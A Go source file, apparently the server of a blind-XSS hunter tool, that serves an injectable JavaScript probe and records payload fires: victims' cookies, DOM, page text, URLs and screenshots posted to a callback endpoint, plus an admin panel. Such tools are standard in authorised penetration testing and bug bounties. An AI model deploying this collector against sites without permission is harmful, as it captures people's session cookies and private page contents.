package main

import (
	"bytes"
	"compress/gzip"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"fmt"
	"io"
	"log"
	"math/big"
	"os"
	"path"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"time"

	"net/http"

	"github.com/google/uuid"
)

func main() {
	fmt.Println("Initializing...")
	initialize_database()
	PrintVersion()
	fmt.Println("Initialized")
	make_folder_if_not_exists(get_screenshot_directory())

	cert, err := generateSelfSignedCertificate()
	if err != nil {
		fmt.Println("Error generating self-signed certificate:", err)
		return
	}

	server := &http.Server{
		Addr:              ":1449",
		ReadHeaderTimeout: 5 * time.Second,
		TLSConfig: &tls.Config{
			Certificates: []tls.Certificate{cert},
			MinVersion:   tls.VersionTLS12,
		},
	}

	mux := http.NewServeMux()

	mux.HandleFunc("/", probeHandler)
	mux.HandleFunc("/js_callback", jscallbackHandler)
	mux.HandleFunc("/health", healthHandler)
	mux.HandleFunc("/screenshots/", screenshotHandler)

	CONTROL_PANEL_ENABLED := get_env("CONTROL_PANEL_ENABLED")
	if CONTROL_PANEL_ENABLED == "show" || CONTROL_PANEL_ENABLED == "true" {
		fmt.Println("Control Panel Enabled")
		mux.HandleFunc("/admin", adminHandler)
		mux.HandleFunc("/static/", staticFileHandler) // Add static file handler
		mux.HandleFunc(API_BASE_PATH+"/auth-check", authCheckHandler)
		mux.HandleFunc(API_BASE_PATH+"/settings", settingsHandler)
		mux.HandleFunc(API_BASE_PATH+"/login", loginHandler)
		mux.HandleFunc(API_BASE_PATH+"/payloadfires", payloadFiresHandler)
		mux.HandleFunc(API_BASE_PATH+"/collected_pages", collectedPagesHandler)
		mux.HandleFunc(API_BASE_PATH+"/record_injection", recordInjectionHandler)
		mux.HandleFunc(API_BASE_PATH+"/version", versionHandler)
		mux.HandleFunc(API_BASE_PATH+"/user_payloads", userPayloadsHandler)
		mux.HandleFunc(API_BASE_PATH+"/user_payload_importer", userPayloadImporterHandler)
	}

	// if err := http.ListenAndServe(":1449", nil); err != nil {
	// 	fmt.Println("Error starting server:", err)
	// }
	server.Handler = mux
	if os.Getenv("ENFORCE_CERT_FROM_GOLANG") == "true" {
		fmt.Println("Server is starting on port 1449 with https...")
		if err := server.ListenAndServeTLS("", ""); err != nil {
			fmt.Println("Error starting server:", err)
		}
	} else {
		fmt.Println("Server is starting on port 1449 with http...")
		if err := server.ListenAndServe(); err != nil {
			fmt.Println("Error starting server:", err)
		}
	}

}

func generateSelfSignedCertificate() (tls.Certificate, error) {
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return tls.Certificate{}, err
	}

	template := x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject: pkix.Name{
			Organization: []string{"Your Organization"},
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().Add(time.Hour * 24 * 365),
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	derBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
	if err != nil {
		return tls.Certificate{}, err
	}

	cert := tls.Certificate{
		Certificate: [][]byte{derBytes},
		PrivateKey:  privateKey,
	}

	return cert, nil
}

func set_secure_headers(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("X-XSS-Protection", "mode=block")
	w.Header().Set("X-Content-Type-Options", "nosniff")
	w.Header().Set("X-Frame-Options", "DENY")

	if r.URL.Path[:4] == "/api" {
		w.Header().Set("Content-Security-Policy", "default-src 'none'; script-src 'none'")
		w.Header().Set("Content-Type", "application/json")
	}
}

func set_payload_headers(w http.ResponseWriter) {
	w.Header().Set("Content-Security-Policy", "default-src 'none'; script-src 'none'")
	w.Header().Set("Content-Type", "application/javascript")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "GET, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type, X-Requested-With")
	w.Header().Set("Access-Control-Max-Age", "86400")
}

func set_callback_headers(w http.ResponseWriter) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type, X-Requested-With")
	w.Header().Set("Access-Control-Max-Age", "86400")
}

func set_no_cache(w http.ResponseWriter) {
	w.Header().Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
	w.Header().Set("Pragma", "no-cache")
}

type JSCallbackSchema struct {
	URI          string `json:"uri"`
	Cookies      string `json:"cookies"`
	Referrer     string `json:"referrer"`
	UserAgent    string `json:"user-agent"`
	BrowserTime  string `json:"browser-time"`
	ProbeUID     string `json:"probe-uid"`
	Origin       string `json:"origin"`
	InjectionKey string `json:"injection_key"`
	Title        string `json:"title"`
	Text         string `json:"text"`
	WasIframe    string `json:"was_iframe"`
	DOM          string `json:"dom"`
}

func jscallbackHandler(w http.ResponseWriter, r *http.Request) {
	set_callback_headers(w)

	// Send the response immediately, they don't need to wait for us to store everything.
	_, err := w.Write([]byte("OK"))
	if err != nil {
		fmt.Println("Error on write ok", err)
	}

	const MaxBodySize = 64 << 20 // 64MB

	r.Body = http.MaxBytesReader(nil, r.Body, MaxBodySize)
	buf := new(bytes.Buffer)
	_, err = io.Copy(buf, r.Body)
	if err != nil {
		fmt.Println("Error on readbody: ", err)
		return
	}

	body := buf.Bytes()

	// Go routine to close the connection and process the data
	go func(body []byte, ip_address string, host string) {
		r := &http.Request{
			Body:   io.NopCloser(bytes.NewReader(body)),
			Header: http.Header{"Content-Type": []string{r.Header.Get("Content-Type")}},
			Host:   host,
		}

		err := r.ParseMultipartForm(32 << 20)
		if err != nil {
			fmt.Println("Error on parse multiform", err)
			return
		}

		payload_fire_image_id := uuid.New().String()
		payload_fire_image_filename := get_screenshot_directory() + "/" + payload_fire_image_id + ".png.gz"

		// Grabbing Image and saving it
		for _, files := range r.MultipartForm.File {
			for _, file := range files {
				fileContent, err := file.Open()
				if err != nil {
					fmt.Println("Error on open: ", err)
					return
				}
				defer fileContent.Close()

				newFile, err := os.Create(payload_fire_image_filename) // #nosec G304
				if err != nil {
					fmt.Println("Error on create", err)
					return
				}
				defer newFile.Close()

				gw := gzip.NewWriter(newFile)
				defer gw.Close()

				_, err = io.Copy(gw, fileContent)
				if err != nil {
					fmt.Println("Error on copy", err)
					return
				}
			}
		}

		err = r.ParseForm()
		if err != nil {
			log.Fatal("Error Parse form", err)
		}

		browser_time, _ := strconv.ParseUint(r.FormValue("browser-time"), 10, 64)
		if browser_time > uint64(^uint(0)) {
			fmt.Println("Browser time is too large. Ignoring.")
			browser_time = 0
		}
		payload_fire_data := PayloadFireResults{
			Url:                   r.FormValue("uri"),
			Ip_address:            ip_address,
			Referer:               r.FormValue("referrer"),
			User_agent:            r.FormValue("user-agent"),
			Cookies:               r.FormValue("cookies"),
			Title:                 r.FormValue("title"),
			Dom:                   r.FormValue("dom"),
			Text:                  r.FormValue("text"),
			Origin:                r.FormValue("origin"),
			Screenshot_id:         payload_fire_image_id,
			Was_iframe:            r.FormValue("was_iframe") == "true",
			Browser_timestamp:     uint(browser_time),
			Correlated_request:    "No correlated request found for this injection.",
			Injection_requests_id: nil,
		}

		injection_key := r.FormValue("injection_key")
		if injection_key != "" {
			query := "SELECT id, request FROM injection_requests WHERE injection_key = $1"

			rows, err := db.Query(query, injection_key)
			if err != nil {
				fmt.Println("Error getting injection request:", err)
			}

			defer rows.Close()

			var injection_requests_id int
			var request string
			for rows.Next() {
				err := rows.Scan(&injection_requests_id, &request)
				if err != nil {
					fmt.Println("Error scanning injection request:", err)
				}
			}

			if request != "" {
				payload_fire_data.Correlated_request = request
			}

			if injection_requests_id != 0 {
				payload_fire_data.Injection_requests_id = &injection_requests_id
			}
		}

		payload_query := `INSERT INTO payload_fire_results 
				(url, ip_address, referer, user_agent, cookies, title, dom, text, origin, screenshot_id, was_iframe, browser_timestamp, injection_requests_id) 
				VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13)`

		_, err = db_prepare_execute(payload_query, payload_fire_data.Url, payload_fire_data.Ip_address, payload_fire_data.Referer, payload_fire_data.User_agent, payload_fire_data.Cookies, payload_fire_data.Title, payload_fire_data.Dom, payload_fire_data.Text, payload_fire_data.Origin, payload_fire_data.Screenshot_id, payload_fire_data.Was_iframe, payload_fire_data.Browser_timestamp, payload_fire_data.Injection_requests_id)
		if err != nil {
			fmt.Println("Error Inserting Payload Fire Data:", err)
			return
		}

		screenshot_url := generate_screenshot_url(r, payload_fire_image_id)
		send_notification("Payload Fire: A payload fire has been detected on "+payload_fire_data.Url, screenshot_url, payload_fire_data.Correlated_request)
	}(body, get_client_ip(r), r.Host)
}

func probeHandler(w http.ResponseWriter, r *http.Request) {
	set_payload_headers(w)

	college_pages := get_pages_to_collect()
	chainload_uri := get_chainload_uri()
	probe_id := r.URL.Path[1:]

	probe, err := os.ReadFile("./probe.js")
	if err != nil {
		log.Fatal("Error reading file:", err)
	}

	host := get_host(r)

	re := regexp.MustCompile(`\[HOST_URL\]`)
	xss_payload_1 := re.ReplaceAllString(string(probe), host)

	re = regexp.MustCompile(`\[COLLECT_PAGE_LIST_REPLACE_ME\]`)
	xss_payload_2 := re.ReplaceAllString(xss_payload_1, college_pages)

	re = regexp.MustCompile(`\[CHAINLOAD_REPLACE_ME\]`)
	xss_payload_3 := re.ReplaceAllString(xss_payload_2, chainload_uri)

	re = regexp.MustCompile(`\[PROBE_ID\]`)
	xss_payload_4 := re.ReplaceAllString(xss_payload_3, probe_id)

	_, errWrite := w.Write([]byte(xss_payload_4))
	if errWrite != nil {
		log.Fatal("Fatal Error on write payload:", err)
	}
}

func adminHandler(w http.ResponseWriter, r *http.Request) {
	set_secure_headers(w, r)
	set_no_cache(w)
	is_authenticated := get_and_validate_jwt(r)

	customFrontendDir := get_env("CUSTOM_FRONTEND_DIR")

	if !is_authenticated {
		// Try to serve custom login page first if custom frontend is configured
		if customFrontendDir != "" && serveCustomFile(w, r, customFrontendDir, "login.html") {
			return
		}
		// Fall back to default login page
		http.ServeFile(w, r, "./src/login.html")
	} else {
		// Try to serve custom admin page first if custom frontend is configured
		if customFrontendDir != "" && serveCustomFile(w, r, customFrontendDir, "admin.html") {
			return
		}
		// Fall back to default admin page
		http.ServeFile(w, r, "./src/admin.html")
	}
}

// staticFileHandler serves static files from the custom frontend directory
func staticFileHandler(w http.ResponseWriter, r *http.Request) {
	set_no_cache(w)

	customFrontendDir := get_env("CUSTOM_FRONTEND_DIR")
	if customFrontendDir == "" {
		http.NotFound(w, r)
		return
	}

	// Remove the leading "/static/" from the path
	requestedFile := r.URL.Path[len("/static/"):]

	// Serve the file from the custom frontend directory
	if !serveCustomFile(w, r, customFrontendDir, requestedFile) {
		http.NotFound(w, r)
	}
}

// serveCustomFile serves a file from the custom frontend directory safely
// Returns true if the file was found and served, false otherwise
func serveCustomFile(w http.ResponseWriter, r *http.Request, baseDir, requestPath string) bool {
	// Clean the path to prevent directory traversal attacks
	cleanPath := filepath.Clean(requestPath)

	// Ensure the path doesn't contain ".." to prevent directory traversal
	if strings.Contains(cleanPath, "..") {
		return false
	}

	// Construct the absolute path
	filePath := path.Join(baseDir, cleanPath)

	// Check if the path is a directory
	fileInfo, err := os.Stat(filePath)
	if err == nil && fileInfo.IsDir() {
		// Try to serve index.html from the directory
		indexPath := path.Join(filePath, "index.html")
		if checkFileExists(indexPath) {
			filePath = indexPath
		} else {
			return false
		}
	} else if !checkFileExists(filePath) {
		return false
	}

	// Set appropriate content type based on file extension
	ext := filepath.Ext(filePath)
	switch ext {
	case ".html":
		w.Header().Set("Content-Type", "text/html")
	case ".js":
		w.Header().Set("Content-Type", "application/javascript")
	case ".css":
		w.Header().Set("Content-Type", "text/css")
	case ".png":
		w.Header().Set("Content-Type", "image/png")
	case ".jpg", ".jpeg":
		w.Header().Set("Content-Type", "image/jpeg")
	case ".svg":
		w.Header().Set("Content-Type", "image/svg+xml")
	case ".json":
		w.Header().Set("Content-Type", "application/json")
	}

	// Serve the file
	http.ServeFile(w, r, filePath)
	return true
}

func healthHandler(w http.ResponseWriter, r *http.Request) {
	set_secure_headers(w, r)
	if establish_database_connection() != nil {
		_, err := w.Write([]byte("OK"))
		if err != nil {
			log.Fatal("Heathcheck Failed: ", err)
		}
	} else {
		w.WriteHeader(http.StatusInternalServerError)
	}
}

func screenshotHandler(w http.ResponseWriter, r *http.Request) {
	set_secure_headers(w, r)

	if get_env("SCREENSHOTS_REQUIRE_AUTH") == "true" {
		is_authenticated := get_and_validate_jwt(r)
		if !is_authenticated {
			http.Error(w, "Not authenticated", http.StatusUnauthorized)
			return
		}
	}

	screenshotFilename := r.URL.Path[len("/screenshots/"):]

	SCREENSHOT_FILENAME_REGEX := regexp.MustCompile(`^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-4[0-9a-fA-F]{3}-[89abAB][0-9a-fA-F]{3}-[0-9a-fA-F]{12}\.png$`)
	if !SCREENSHOT_FILENAME_REGEX.MatchString(screenshotFilename) {
		http.NotFound(w, r)
		return
	}

	gzImagePath := get_screenshot_directory() + "/" + screenshotFilename + ".gz"

	imageExists := checkFileExists(gzImagePath)

	if !imageExists {
		http.NotFound(w, r)
		return
	}

	w.Header().Set("Content-Type", "image/png")
	w.Header().Set("Content-Encoding", "gzip")

	http.ServeFile(w, r, gzImagePath)
}
